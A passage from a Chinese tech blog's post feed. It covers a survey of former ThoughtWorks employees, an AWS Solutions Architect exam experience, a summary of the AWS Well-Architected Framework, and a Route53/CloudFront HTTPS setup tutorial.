毕竟是还了个国家，生活方式截然不同。 你认为骚窝对你最大的改变是什么？ ThoughtWorks给我了太多人生的第一次。 第一次做开源项目，第一次做公开演讲，第一次做售前，第一次做咨询，第一次被人骂代码写得差，第一次把项目做失败……如果没有ThoughtWorks这个平台，可能我依然在过着庸庸碌碌的日子，抱怨现实的压力但又不去设计自己的未来。 这里很累、辛苦、费脑子，在ThoughtWorks注定了要迎接一个又一个挑战，而且很多都是突如其来的。比如在你开会的时候销售总监把你拉出来说过几天有个项目要上，你去一下。 这里有很多很优秀的人，而且更重要的是，他们完全不吝啬将自己的经验、经历、思考问题的过程拿出来跟人分享。当看到他们的邮件他们的博客，我就有种感觉，这些人的存在完全就是为了在你前行的路上亮起一盏灯光，甚至供你仰望的。但这种感觉很好。当你困惑的时候有人诉说，当你懈怠的时候知道其他人都在干什么。 在出差的过程中你会跟同事们结下深厚的友谊，一起准备session，总结回顾，规划项目前景，解决疑难……一切的一切，在过往的工作经历中都是体会不到的。 有一天我选择了走自己的路，但是我前些日子面试的时候，面试官是ThoughtWorks墨尔本办公室之前的Mobile Tech Lead，我问他跟我结对编程过后的感受，他说，“感觉很舒服，很自在，就像回到了ThoughtWorks一样”。那一刻我深刻的感觉到了四年间ThoughtWorks在我身上留下的烙印。 你最怀念骚窝哪一点儿？ 人。 【骚人九】在骚窝4年,2016年离开 离开骚窝后，有什么让你兴奋？ 投入到建设国家健康医疗大数据平台的试点工程中 你现在的工作和生活方式，与在骚窝最大的不同是什么? 周围可用的人才太少，或者可塑之才太少 你认为骚窝对你最大的改变是什么？ 开放的理念，社会公正的实践，当然也有自己技术上的提高 你最怀念骚窝哪一点儿？ 随便抓个人都能打硬仗 你想对骚窝或者骚窝的某个人说几句话吗? 加油 【骚人十】在骚窝3年,3年前离开 离开骚窝后，有什么让你兴奋？ 干事终有有头有尾了。 你现在的工作和生活方式，与在骚窝最大的不同是什么? 专注，可以专注于一个产品，围着这个产品方方面面都做。 全功能，技术不再是唯一的关注点，市场，运营，业务，营收，广告，管理团队，修网络，搭VPN，交办公室租金，给新来的小朋友买电脑，和打扫卫生的阿姨唠嗑...... 你认为骚窝对你最大的改变是什么？ 开阔了视野，给了一种可能 你最怀念骚窝哪一点儿？ 人，还是那帮人，虽然大部分都离职了 你想对骚窝或者骚窝的某个人说几句话吗? 喵同学，你还在等什么 【骚人十一】在骚窝两年半,一零年一月离开 离开骚窝后，有什么让你兴奋？ 拿到了全额奖学金去美国读书了。当学生的感觉和在骚窝差不多，一样兴奋😊 毕业后去了谷歌 你现在的工作和生活方式，与在骚窝最大的不同是什么? 我现在在谷歌总部的搜索架构组，需要是做大规模的并发系统的开发和优化。这里软件过程比较少。需求都是自己提的。少了些思想的碰撞。当然赚的多了些😄 你认为骚窝对你最大的改变是什么？ 接触到不同的客户锻炼到自己的同理心了。了解到了每个人看问题的不同角度。当然明白了软件开发的流程。现在我还在用这些方式来组织我带领的技术小组的开发工作。 你最怀念骚窝哪一点儿？ 结对编程😄很喜欢和不同的人工作。学到很多知识、结识了很对朋友 你想对骚窝或者骚窝的某个人说几句话吗? 当时走得很匆忙，没能和大家打好招呼。后来的这些年很想念大家。希望有机会能再见。 【骚人十四】在骚窝4年半,2013.05离开 离开骚窝后，有什么让你兴奋？ 业余生活丰富起来，聚会多起来。好奇怪，很多人说国外好寂寞。 你现在的工作和生活方式，与在骚窝最大的不同是什么? 工作：各种不靠谱程序员，各种号称扁平是管理的老板。 生活变化不大。 你认为骚窝对你最大的改变是什么？ 在职场人和人可以这样高效自组织协作。 你最怀念骚窝哪一点儿？ feedback，开放式协作 你想对骚窝或者骚窝的某个人说几句话吗? 你仍然是我爱的最深的那家前公司。你最初的梦想是很多人至今的梦想，在我们心里你永远祝福你不忘初心。 【骚人十五】在骚窝一年半,2016年离开 是否得到了当初离开时想要追求的东西？ 是 离开骚窝后，有什么让你兴奋？ 周围同事平均水平更高了，不用和客户撕扯了，可以专心做东西 你现在的工作和生活方式，与在骚窝最大的不同是什么? 不用每天各种会和敏捷形式化了 你认为骚窝对你最大的改变是什么？ 敏捷开发更适合交付项目 你最怀念骚窝哪一点儿？ 压力小，交付项目做完就不用操心维护和业务了，不用oncall 你想对骚窝或者骚窝的某个人说几句话吗? 谢谢大家的帮忙^_^美帝血汗工厂的微服务做的一点也不好^_^ 【骚人十六】在骚窝俩年多,2013年底离开 是否得到了当初离开时想要追求的东西？ 离开时没有什么新的追求 离开骚窝后，有什么让你兴奋？ 做不同的事情，尝试不同的岗位 你现在的工作和生活方式，与在骚窝最大的不同是什么? 自由 你认为骚窝对你最大的改变是什么？ 觉得牛人还是很多的，上学的时候觉得牛人太少 你最怀念骚窝哪一点儿？ 年轻的朋友们 【骚人十七】在骚窝1.3,2015离开 是否得到了当初离开时想要追求的东西？ 差不多 离开骚窝后，有什么让你兴奋？ 能将自己所学的项目管理方法，学以致用，以证明自己哪些是用的，哪些是错的。 你现在的工作和生活方式，与在骚窝最大的不同是什么? 生活方式没有变，工作变了，要学会适应非全功能团队的协作方式（可以是中国传统的协作方式） 你认为骚窝对你最大的改变是什么？ 思维方式变了。也变得更包容了。眼界变得开拓了。 你最怀念骚窝哪一点儿？ 在TW待过两个团队，和他们一起工作时的氛围。也就是和他们一起工作太开心了。 你想对骚窝或者骚窝的某个人说几句话吗? 胡凯，感谢你抽时间回复我邮件，帮助我成长。还有，你是对的，我真的又离职了，产品终归是别人的，我没有能“做自己的产品”。 我知道了，除非自己做老板，不可能完全做自己的产品。 【骚人十八】在骚窝1年,2016-10离开 是否得到了当初离开时想要追求的东西？ 追求的东西一直都在变化，随着年龄的增长追求的内容也不同，离开以后发现了更多需要自己去熟悉的内容，不仅仅局限在dev范围内部。有得也有失。 离开骚窝后，有什么让你兴奋？ 可以全身心的工作到自己的产品中，在离骚每个项目做完以后，就会有另一个项目等着你，之前做过的项目到底是否成功，用户量有多大，并没有多少反馈。项目的结束给我带来的成就感远远小于自己做一个产品上线以后，看到不断有用户注册时的激动。 你现在的工作和生活方式，与在骚窝最大的不同是什么? 不用天天在客户现场应对各种问题和challenge. 你认为骚窝对你最大的改变是什么？ 对技术栈的重新定义，对客户的认识以及业务知识 你最怀念骚窝哪一点儿？ 自由的工作方式，自己想做点什么事情没有任何阻拦。 你想对骚窝或者骚窝的某个人说几句话吗? 对Dev说，技术不是最终的追求，这个世界是业务起主导作用的世界，没有业务驱动技术很难有实施性的发挥。当技术和业务发生冲突的时候，临时的避让或者妥协是很好的解决方案。没有清晰的对错分界线，也没有技术水平高低的判断条件。当产品满足业务需求，当客户欣然接受，这就是最好的交付结果。远比用各种fashion的技术栈来得实在。 对业务说，业务是主导一切的根源，发现业务和挖掘业务也许是未来发展的新标向。在骚窝做业务的同学们应当发挥比dev更重要的作用，你们是技术实现的基石，也是客户的向导。 对UX说，你们的水平可以说是目前竞争对手中做得最好的团队，一个产品的设计在默写程度上可以左右项目的认可度，提高产品的Level。当客户第一眼看到产品的时候，他们看的不是你用了reactjs还是vuejs，也不是业务需求是否满足。而是产品的外观是否吸引用户。提高设计能力和水平是骚窝继续往下发展的重要法宝。 对PM说，在如此竞争激烈的市场下，每个团队都可以快速开发MVP并投入市场。敏锐的发现市场需求和控制项目进度是制胜的法宝，让客户把他们的成败压在咱们的交付产品或咨询上是把拉近客户的必要手段，我们不一定一直处在乙方的位置，真要是到了一定程度，说不定谁是乙方谁是甲方。提高我们在客户面前的话语权，深度挖掘积累某个行业、领域的知识是我们项目往下走的方向。 【骚人十九】在骚窝6年多,2013离开 是否得到了当初离开时想要追求的东西？ 还行 离开骚窝后，有什么让你兴奋？ 踏踏实实做产品 你现在的工作和生活方式，与在骚窝最大的不同是什么? 工作上更注重流程了，也更注重每个决策的长期影响 生活上没有国内那么丰富，但得到了环境上的回报 你认为骚窝对你最大的改变是什么？ 锻炼了思维方式，从其他角度看软件开发 你最怀念骚窝哪一点儿？ 丰富的思维碰撞 你想对骚窝或者骚窝的某个人说几句话吗? 希望每个骚窝人不忘初心，成为思想工作者，通过软件成为更好的自己 从以上调查中可以大致可以分析得出以下信息： 前TWer们大部分是比较认可TW的企业文化的，认为这里有一帮聪明且主动性强的同事，以及宽松自由的工作环境，想做就做的干劲，同时也有会议太多，沟通花费过高等弊病 离职后的人一部分人创业，一部分人移民，一部分在国内大公司发展 在TW时往往只能受雇于人做一些产品开发，这常常成为TWer离职的原因——没有自己的产品 在以上发言中，七号，十一号，十八号，给我的印象最为深刻。曾经有人告诉我：入职第一天就为离职做好准备的员工是好员工。因为这样的员工往往会保持高度的警惕且持续学习，随时辞职随时都能找到更好待遇的工作的目标，保证了员工提供给公司是高于自己待遇的价值。所以企业最看重的，是价值；职场上最重要的，应该是人。","tags":[{"name":"ThoughtWorks","slug":"ThoughtWorks","permalink":"https://www.duyidong.com/tags/ThoughtWorks/"},{"name":"职场","slug":"职场","permalink":"https://www.duyidong.com/tags/职场/"}]},{"title":"AWS助理架构师认证考经","date":"2017-04-05T06:48:45.000Z","path":"2017/04/05/How-to-pass-the-aws-certification/","text":"上周去参加了AWS助理级架构师的考试并顺利通过，是2017年的第一个小目标也是对云服务知识的一个检验，在此分享一下考试的经过和经验。 什么是AWS认证亚马逊作为云计算领域的领头羊，在云计算领域已经有了十多年的积累，亚马逊的云计算不论是从服务还是性能在全球都是首屈一指的。近年来国内有很多创业公司依托于阿里云，微软云，Ucloud等IaaS, PaaS服务构建了许多SaaS服务，其中不乏客如云之类的成功案例，许多大型企业也将自己的基础设施往云上迁移。近两个月腾讯云和中国电信两次以0.01元中标政府云服务项目更是起到了推波助澜的作用。如此种种，可见云服务在IT届的地位已经越来越高，对于从业者的云计算知识要求也必然会越来越高。那么考取云服务界领头羊亚马逊的认证也会变得越来越有价值。AWS目前仅有助理级和专家级两个级别，2017年还会加入大数据，安全，网络三个认证。就目前有的认证而言，开发者(Developer)认证应该是最好考的，助理方案解决架构师(Solutions Architect)次之，助理级最难的是运维（SysOps）。要取得专家级认证必须先取得助理级认证，关系如图： 关于八个认证的难以程度即考取顺序建议如下： 笔者选择先考助理架构师，意在先建立一个比较全面和高视角的认识，再考Developer和Sysops也会比较容易。AWS认证是检测自己云计算领域知识最好的方式，同时也是增加求职筹码的一个不错的选择。 我的考试经历背景笔者在准备考试前有一些AWS的使用经历，大部分在项目中使用，但服务涉及很窄，基本只限于创建instance，明白不同Subnet意味着不同网段。为公司项目做过AWS的虚拟机方案预算，基本知道Instance Type以及Cost有关的一些东西。从开始准备到正式考试大概两个月，每天投入3-4小时，主要花费在阅读文档和动手练习，另外还买了acloud.guru上的一个课程，价格29美刀，没有购买AWS的练习题。 考前准备 参考AWS官方考试介绍定位考试的大致方向 仔细阅读考试大纲，了解考试设计到的知识点和大纲 根据AWS的官方文档梳理了AWS现有的重要服务 认真过了一遍关于EC2，IAM，S3有关的文档，这几个服务加上VPC和RDS为考察的重点，同时也是AWS的核心服务 在AWS上做了一些操作练习，主要包括： 在AWS上搭建了public &amp; private subnet的典型网络结构 在AWS上搭建了一个ELB+Autoscaling的高可用的网站 将自己的博客迁移到AWS上，并使用Cloudfront做CDN和Route53做DNS解析 仔细大量地阅读了FAQ 看了一下AWS的几个白皮书，包括AWS服务概览，关于架构，安全最佳实践，AWS最佳实践，主要认真理解了什么样的架构是一个良好的架构 做了大约两百道练习题，事实在上考试的时候有百分之二十的都是在见过的原题。 考试考试首先要在网上注册预约：https://www.webassessor.com，需要visa卡支付，并提供公司名称，地址等信息。考试地点在成都上普财富中心2514鸿景国际教育，锦江宾馆地铁站出站走几步就是，是一家代理考试点，每次同时只有一个人考试，在一个独立的房间，有一位监考员，负责帮你准备考试的环境。考试原则上不允许带手机，使用考点的笔记本电脑，并且是远程连接到美国，所以网络会比较卡顿，经常做题做着做着就白屏了，需要刷新才能继续，有些考验心理素质。考试是80分钟60道题，据说判断是否过关是根据一段时间考试的人的成绩取排名靠前的百分之六十的人作为比较，达到这个标准就算过关，考试完后立马知道分数。根据以往的经验，一般分数在65分以上可以过关。考试分单选和多选，多选题会有提示有几个选项，每道题可以标记“Mark this item for later review”，系统会在答题完成后给出所有待检查的题号以重新作答，还是比较方便的。根据考试经验，得分往往会低于做的时候的感觉期望，由于考试时间并不紧张（笔者在完成答题后还剩半个小时交卷），一定要认真检查，最好知道每个题要考察你什么知识，很多题都是有坑的，如果你能把考察点说出来，这道题多半是没有问题的。考试完后随即你就会在邮箱里收到一封这样的证书： 总结AWS方案解决架构师助理级的考试总的来说难度不大，主要考察的就是在何种需求场景下应该选择AWS的何种服务，考试分为设计一个符合最好架构设计原则的系统；工具和开发；安全；以及解决问题四个部分，设计一个良好的架构是最重要的也是最能体现云服务意义的，需要好好准备。工具和开发考察的是动手操作的能力，一般做够几个实验都没什么问题。安全方方面面都有涉及，考察的比较细致，主要是针对不同场景需要使用权限管理，网络管理，服务策略管理等不同方式，配合AWS的安全最佳实践白皮书问题不大。最后一个解决问题在AWS文档中很多部分都是Troubleshooting，比如Troubleshooting Connecting to Your Instance，Troubleshooting IAM，Elastic Load Balancing Connectivity Troubleshooting都是可能被考察的内容，需要阅读文档的时候足够仔细。另外，给出一些考试资料供参考： AWS测试题： https://quizlet.com/152377618/aws-certified-solutions-architect-associate-practice-questions-flash-cards/ http://www.aiotestking.com/amazon/category/exam-aws-saa-aws-certified-solutions-architect-associate/ 一个关于考试的feedback: https://acloud.guru/forums/aws-certified-solutions-architect-associate/discussion/-KSDNs4nfg5ikp6yBN9l/examfeedback-_20_specific_po AWS博客：https://aws.amazon.com/blogs/aws/ 两篇同事的博客： http://www.huangbowen.net/blog/2014/10/27/how-to-pass-the-aws-certification/ http://www.jianshu.com/p/02233ae66b80 Jayendra的博客：http://jayendrapatil.com/ Youtube上deep dive的视频：https://www.youtube.com/results?search_query=aws+deep+dive AWS官方教学小视频： https://aws.amazon.com/training/intro_series/","tags":[{"name":"学习","slug":"学习","permalink":"https://www.duyidong.com/tags/学习/"},{"name":"AWS","slug":"AWS","permalink":"https://www.duyidong.com/tags/AWS/"},{"name":"云计算认证","slug":"云计算认证","permalink":"https://www.duyidong.com/tags/云计算认证/"},{"name":"Certification","slug":"Certification","permalink":"https://www.duyidong.com/tags/Certification/"},{"name":"AWS认证考试","slug":"AWS认证考试","permalink":"https://www.duyidong.com/tags/AWS认证考试/"}]},{"title":"AWS认为，什么样的架构是一个良好的架构","date":"2017-03-23T14:01:23.000Z","path":"2017/03/23/AWS-well-architected-framework/","text":"AWS Well Architected framework，其实是亚马逊的一封白皮书，围绕云架构设计的安全性，可靠性，负载，花销，运维（2016年11月加入）五个支柱阐述了一个良好的架构应该遵循什么样的原则，以及一些最佳实践。 亚马逊在云服务届处于世界领先水平，且在十多年的云架构实践中已经积累了相当的经验，该白皮书是对这些经验的一个总结和提炼。不管是对于考试，对于成为一个云架构师，还是对于单纯的学习和了解云服务，都是一份不可多得的好材料。下面附上资源地址：https://d0.awsstatic.com/whitepapers/architecture/AWS_Well-Architected_Framework.pdf 啰嗦几句自从互联网诞生以来，各互联网公司通过将自己服务器的端口暴露在公共网络的方式提供服务，普通用户通过供应商接入公共网络，与公司服务器建立连接进行数据传输，从而实现“上网”的功能。对普通用户而言，终端以外的世界都是黑盒，而对于提供服务的互联网公司而言，则要运维大量的服务器，交换机等设备，为了保证服务的可靠性，容灾能力，为了开发，测试，常常需要维护超过实际提供服务的服务器数量很多倍的基础设施。又例如，在淘宝双十一期间可能由于用户访问量基层淘宝需要临时增加一倍的服务器数量来保证服务的正常运行，而在活动结束后，又需要恢复正常的服务器数量，那么这多出来的一倍服务器难免就会造成资源浪费。而且在很多时候，传统运维的背景下，申请一台服务器时间很长，手续繁琐，为了方便，研发部门通常会申请超出所需的基础设施资源，“以备不时之需”，这样的情况也会给企业造成大量的浪费。云服务，就是为了解决这种种问题而诞生的。 最简单的云服务模型，就是在云服务厂商集中托管了一个超级大型的服务器群，云服务厂商通过对外租赁服务器的形式代替了互联网厂商自己维护服务器的方式。这样做的好处在于一是避免了闲置基础设施资源的浪费，二是随着云服务的不断普及，以及Agile，DevOps运动的兴起，人们对IT设施的灵活度要求越来越高，这两年Infrastructure as Code（基础设施即代码）的理念已经被越来越多的厂商应用到生产实践中去，基础设施及代码的理念，和云服务是一脉相承的，租户可以更快地申请到设备，可以更灵活的对自己的设备定制化，规定大小，容量，甚至预配置一些环境，和自己的服务紧耦合，使公司的生产活动可以跟多的关注在业务上，而不用去操心服务器的性能，预估自己能承受的访问量，从而给业务发展带来更大的发展空间。这一点表现在今年AWS大力在推行的的Serverless架构上。在笔者看来，云服务并不是一个技术上的创新，而更像是一种商业模式，为了让企业更灵活的适应瞬息万变的市场和用户需求，为了使社会资源更加合理化配置，同时，云服务也是信息全球化的重要一环，为人工智能，大数据奠定了基础。 如何定义一个良好的架构AWS从五大支柱来判定一个架构设计得是否优秀： Security安全：保护信息，系统安全，在风险可控的前提下对外提供服务，以及迁移的策略 Reliability可靠：系统的容错能力和自我修复能力，系统在负载增加时动态获取计算资源以满足业务需求，以及在系统模块发生故障时自动替换掉故障模块 Performance Efficiency负载能力：根据系统需要，伸缩负载的能力 Cost Optimization资费优化：在满足需求的情况下花尽可能少的钱 Operational Excellence运维出色：业务连续性，系统状况监控预警能力 一般设计原则（General Design Principles） 停止估算需要多少基础设施，架构可以根据业务情况灵活伸缩 构建一个和生产环境完全一致的测试环境，你可以在测试环境完全模拟生产环境的情形，并在完成测试之后清理掉所有资源 自动化使架构变更的风险更低，基础设施及代码的好处，让架构可复制，架构变更变得可追踪，且减少了很多情况认为操作带来的风险 允许架构更灵活地变更，一是风险更低，因为变更可追溯，二是架构可以被及时回滚，三是彻底的变更成本很小 数据驱动型架构，灵活的架构方式允许你使用面向数居的架构方式 通过“game day”来提升架构，由于架构可以被轻易的复制且用户只需要按使用付费，租户可以在任意时候测试自己的架构是否存在安全漏洞，是否存在可以被改进的地方 下面白皮书围绕以上提到的几大优秀架构的设计支柱，提出了一系列设计原则，最佳实践以及实践这些最佳实践可以用到的服务： 安全（Security Pillar）设计原则 在每一个层面引入安全：除了应用安全还应该在网络，负载均衡器，防火墙，操作系统关注安全 可追溯：保证系统的每一次操作/更改都被记录日志，并对日志进行审查 确保“最小权限原则”：确保每一个资源都被赋予了恰好需要的最小权限，实时审查这些权限，及时清理掉没用的权限 关注在你的系统安全：根据AWS的责任划分模型，关注在用户应该负责的系统安全和数据安全层面 自动化安全最佳实践：使用基于应用层的策略保证安全问题能够被快速修复，例如，创建打好补丁的镜像，然后让所有之后创建的instance使用这个镜像；再例如，对常见安全问题自动响应和自动修复故障 定义AWS将最佳实践划分为五个范畴： 数据保护 认证和权限管理 架构保护 追踪控制 事件响应 在设计你的架构之前，你需要知道谁可以对你的系统做什么，此外，你还希望确定判断每个发生在系统的事件是否安全，保护你的操作系统和服务，你需要维护和保密你的数据，你还需要做到系统对安全事件能够自动响应。 最佳实践数据保护确认只有必要的用户有访问部分数据的权限，确保数据在存储时被加密，传输过程中被加密，使用IAM，以下实践可以保证你的数据安全： AWS的用户享有对所有数据完全的控制权 AWS确保用户可以轻松对自己的数据进行加密，并提供方法管理加密所使用的key，并可以通过AWS或者用户自己定义的方式自动定期更换key（Key Management Service） AWS允许开启详细的日志信息，包括文件的权限变更（CloudTrail） AWS提供极高的可用性保证你的数据不会丢失（S3） 开启版本管理，可以作为数据生命周期的一部分，可以保护对数据的误操作 AWS默认不会对数据做跨Region的转移或备份，即数据不会离开它所在Region的“国家/城市” 另外两个重要的问题： 如何保证数据存储时加密？ 如何确保数据传输过程的加密？（SSL） 认证和权限管理通过亚马逊的AMI，租户可以完全控制根账户下每个用户，以及应用对所有资源的访问权限，确保每个User和Role只拥有必须的权限是必要的，同时确保每个资源只在被授权的情况下才能够被访问和使用。常见的权限管理包含以下内容： ACL（用于管理用户对于S3中存放对象的操作访问权限） 基于Role的权限控制 密码管理（定期更换密码） 同样，几个问题： 如何保证根账户的安全？（是否开启了第三方验证，是否删掉了Access Key） 如何保证User和Role的权限是安全的？（是否使用Group管理用户） 如何限制应用程序，脚本，或第三方工具对AWS资源的控制访问权限？ 如何管理Key和证书？ 架构保护通常来说架构保护指的是对本地数据中心的保护，在AWS的白皮书中主要提到的是对于VPC的保护，主要包括VPC中的Security Group，Network Control list，路由策略 几个问题： 如何管理你的网络策略，和设备安全？（是否有内外网划分，在外网的Instance的登录验证是怎样的，有没有开启多重验证） 服务层面的安全管理？（多少用户有对你资源的访问权限，是否有对这些用户进行分组管理，是否对这些用户的验证进行了强行的限制，如强密码和定期更换密码，等等） 如何保证你的系统安全，如何运维监控你的服务？ 追踪控制以下服务可以用于设施变更的追溯及审查： CloudTrail，用于记录AWS API的每一次操作，并生成日志保存在S3中 Amazon CloudWatch，用于实时监控和预警 AWS Config Amazon S3 Amazon Glacier 常见问题： 如何获取和分析你的日志？ 涉及到的服务（Key AWS Services） 数据保护：加密数据存储和传输：ELB, S3 &amp; RDS 权限管理：IAM, MFA 架构保护：VPC, NCL, SG 追踪控制：CloudTrail, Config, CloudWatch 可靠性（Reliability Pillar）设计原则 测试覆盖率 自动修复错误 水平扩展 停止猜测生产力 自动追踪架构变更 最佳实践建立基础在开始架构设计之前，选择Region，确立方案。 如何管理AWS对服务数量的限制 如何设计网络拓扑 是否有预留空间用于处理技术难题 变更管理这里说的变更主要指的是架构的水平扩展 如何根据业务需求进行系统变更 如何监控变更 如何执行变更（自动化） 容错管理 数据备份 灾难恢复 如何应对应用组件失效 如何对系统弹性进行测试 涉及到的服务 建立基础：IAM, VPC 变更管理：CloudTrail 容错管理：CloudFormation 性能负载（Performance Efficiency Pillar）这一个支柱的核心思想是如何使用变更的计算资源来满足日益变化的业务需求 设计原则 为用户隐藏更多的细节让用户可以轻松调度资源，更关注在产品的业务价值 数分钟内让服务发布到全球 使用无服务（Serverless）架构 更容易实验 使用最符合用户想要实现的技术方法。例如，在选择数据库或存储方法时考虑数据访问模式。 最佳实践选择 架构：数据驱动/事件驱动/ETL(数据仓储)/Pipeline，架构的选择决定了以下几种资源的选择 计算：Instance（type, monitor, quantity ）/Container/Function，同时要考虑到水平扩展能力 存储：涉及到存储服务选择（S3/S3 IA/S3 RRS/Glacier），存储介质选择（SSD/HDD） 存储方式：块存储、文件存储、对象存储 访问方式：随机还是连续 吞吐量要求 访问频率：在线、离线、存档 更新频率：缓慢变更、动态实时更新 可用性限制 数据耐久度限制 数据库：RDS/DynamoDB/Redshift 网络：考虑地址，网络延迟（是否需要PlacementGroup），在各服务组合方式中寻找合适的配置Cloudfront, VPC, DirectConnect, Route53 回顾审视设计好一个架构，应该再次审视你的架构是如何配合业务需求的，以及随着业务的改变，当引入新的资源类型和功能时，如何确保继续拥有最合适的资源配置？ 监控如何监控服务器负载和性能 时间空间的平衡如何用增加空间，冗余备份的方式提高系统响应速度，增加性能负载。最明显的例子就是利用Cloudfront将静态文件缓存到各个节点从而增加各个地区的访问速度 涉及到的服务 选择 计算：Auto Scaling是关键，确保你拥有合适数量的Instance来满足业务需求 存储：EBS提供灵活多样的存储介质及参数，比如SSD, PIOPS，S3提供了静态文件交付方式，Amazon S3 Transfer Acceleration使用户可以远距离，快速，方便，安全的传输大文件 数据库： RDS（IOPS，Read Replicas）DynamoDB可以灵活扩展且提供毫秒级延迟的服务 网络：Route53可以提供根据地区延迟分发的路由策略，VPC endpoint(NAT, VPN, Direct Connect)开启灵活的网络互连 回顾审视：AWS Blog和AWS What’s New section可以看到AWS又推出了何种新服务 监控：AWS CloudWatch提供了不同维度(Metrics)的监控，触发事件(alarms)，以及提示(Notifications)，可以配合Lambda对监控事件作出反应 空间换时间：AWS ElastiCache，Cloudfront，Snowball，以及RDS的Read Replicas都是为了空间换时间的典型 费用优化（Cost Optimization Pillar）设计原则 采用消费模式：根据使用情况实时变更资源配置，而不是精确估计资源使用情况 收益与经济规模：因为AWS拥有比单个企业大得多的经济规模，可以在各个企业的需求之间平衡资源需求，所以价格将会更加便宜 停止在自建数据中心中的投入 分析支出：云使得资源利用率和成本更加透明，有助于企业主衡量投资回报率，并为用户提供优化资源降低成本的机会 托管服务降低成本 最佳实践 更佳有效地利用资源 更贴近业务需求 支出意识： 清楚地认识到哪些服务是会被收费的，收费方式怎样，哪些服务是免费的 监控支出 及时关闭不被使用的资源 给资源配置权限管理以控制花费 随时优化 涉及到的服务 有效利用资源：对于EC2，申请预留实例以减少开销，使用 AWS Trusted Advisor 找到可以减少花费的方式 贴近业务需求：Auto Scaling 支出意识：CloudWatch用于监控花费情况，SNS用于提示超出预算的花费 随时优化：AWS Blog和AWS What’s New section以及 AWS Trusted Advisor 运维出色（Operational Excellence Pillar）运维出色应该是AWS配合DevOps运动推出的一系列实践： 设计原则 使用代码执行运维操作：运维的一个发展趋势是越来越自动化，比如我们可以用自动配置管理工具配置更改环境，响应实践等 强调配合业务需求的运维：将运营流程与业务目标相一致，减少不必要的运维指标 定期，小步，增量式的运维：工作负载应设计为允许组件定期更新，运维的更新也应该小步前进，且容易被回滚，在维护和更换组件时不应造成宕机时间 启用测试以对运维的误操作及时响应：对于组件更替和运维的操作应该有测试，及时发现变更错误以便于修复或回滚 在错误中学习：定期回顾对运维事件的处理方法以改进，持续推动卓越运维 保持操作流程：团队之间相互学习，及时更新文档，保证团队运维操作有统一流程，统一的运维方式 最佳实践 准备：何种最佳实践？选用何种配置管理？ 开始作业：如何小步前进，如何监控每一次运维操作？ 响应：如何对计划之外的运维操作做出响应？ 涉及到的服务 准备：AWS Config，AWS Service Catalog，使用Auto Scaling和SQS来保证运维的连续性 作业：这一部分主要是CI/CD: AWS CodeCommit, AWS CodeDeploy, and AWS CodePipeline 响应：CloudWatch alarm FAQ可以看到AWS对于优秀网站的设计，除了一般要求的可靠，省钱，还根据云服务的基础设施可灵活变更的特点强调了水平扩展和架构灵活变更，以更好地满足业务需要，保证业务连续性(business continuity)白皮书最后还给出了FAQ（Frequently asked questions）部分回答了一些关于最佳实践的常见问题，非常值得一看。","tags":[{"name":"AWS","slug":"AWS","permalink":"https://www.duyidong.com/tags/AWS/"},{"name":"Cloud Native","slug":"Cloud-Native","permalink":"https://www.duyidong.com/tags/Cloud-Native/"},{"name":"架构","slug":"架构","permalink":"https://www.duyidong.com/tags/架构/"},{"name":"Cloud","slug":"Cloud","permalink":"https://www.duyidong.com/tags/Cloud/"}]},{"title":"使用AWS解锁HTTPS和CDN","date":"2017-03-20T12:23:37.000Z","path":"2017/03/20/Enable-HTTPS-and-CDN-with-Cloudfront/","text":"在上一篇博客中，笔者已经介绍了将hexo博客发布到S3，这一部分我将介绍如何使用AWS的Route53应用上自己的域名，以及如何使用Cloudfront开启HTTPS/HTTP2和CDN加速。 关于Route53Route53是AWS提供的DNS服务，提供常见域名服务，用户可以使用Route53注册使用域名，指向自己的服务，可以除了一般域名服务都支持的A类地址（直接指向IP），及CNAME（指向另一个域名）以外，Route53还支持一个功能叫做A-record，即可以将DNS指向AWS内部的资源，该服务功能与CNAME基本相同，但是免费。此外，Route53支持以下几种路由策略： Simple Routing Policy：通常在只有一个资源的时候使用这种策略，该种策略会自由（平均）分配负载给所属资源 Weighted Routing Policy：加权路由，这种路由策略支持用户指定的路由百分比，比如百分之20的流量导入测试环境，百分之80的流量导入产品环境，用于进行AB测试。 Latency Routing Policy：该种策略会根据客户端访问的延迟情况选择合适的服务，比如一个客户访问A延迟为20毫秒，访问B服务延迟为250毫秒，那Latency Routing就会把该用户的访问导入A服务。 Failover Routing Policy：该路由策略在其中一个被路由资源宕机的情况下会停止流量引入，从而避免用户访问到错误页面，这里涉及到Route53的另一个功能———健康检查。 Geolocation Routing Policy：地理位置策略允许用户设置将不同地理位置的用户流量导入到不同服务，例如希望悉尼的用户和北京的用户在一个网站上看到不同的页面，可以采用这种路由方式。 关于CloudfrontCloudfront是AWS的CDN(Content Delivery Network, 内容分发网络)服务，利用AWS分布在全球的节点服务器（Edge Location）缓存用户的访问，用户在第二次访问（或同区域的另一个用户在非首次访问）页面时会直接从节点服务器取到已经缓存的数据，速度会大大加快。同理，Cloudfront也可以用于文件上传。 申请Route53和Cloudfront权限默认情况下，所有账户都是没有开启Cloudfront和Route53服务的，这个时候需要使用账号注册邮箱发送邮件到aws-verification@amazon.com申请开通。 申请域名得到服务使用权限之后，还需要申请一个域名，这个时候可以在AWS的Route53进行购买，也可以在阿里云的万网注册一个域名，域名会按使用年数收费，不同域名收费不同。在亚马逊购买域名，只需要进入Console，在Register Domain栏输入你想要的域名，点选Check，接下来如果域名可用，可以Add to Card然后付费即可。大约一小时后，这个域名就可以被使用了。 配置Cloudfront点击Create Distribution按钮，Delivery method选择Web。 Web主要针对一些html，css,js等静态文件，而RTMP则主要是一些音视频文件。点选“Get Start”。 下一步，要选择Origin,即要进行内容分发的源。虽然亚马逊会自动列出你的S3 bucket，但是千万不要选。而是自己手动输入example.com这个Bucket的Endpoint(Endpoint在S3 Console的Properties标签下的Static Website hosting里看得到)。为什么不直接选S3 bucket那?这是因为当我们访问一个目录时，我们期望能返回默认的object。虽然CouldFront有个Default Root Object设置，只是对根目录起作用，对子目录不起作用。如果使用Bucket的Endpoint，再加上之前已经给该Bucket配置了Default Object，就可以解决这个问题。 选择将HTTP重定向到HTTPS，在CNAMEs项中输入自己的域名，多个域名以逗号分隔。在Distribution Setting下选择你自己的证书(如果没有可以点选Request or Import a Certificate with ACM免费申请)。 [可选]勾选Logging，并选择Bucket for Logs，可以打印访问信息。由于是静态网站，Cookie的Log就没有必要了。 点选Create Distribution，创建成功，需要等待大约半小时等待Status从In progress变为Deployed，在这期间可以配置Route53。 配置成功后可以在管理员面板修改所有创建Distribution时设置的参数，并可以增加Error Page等设置。 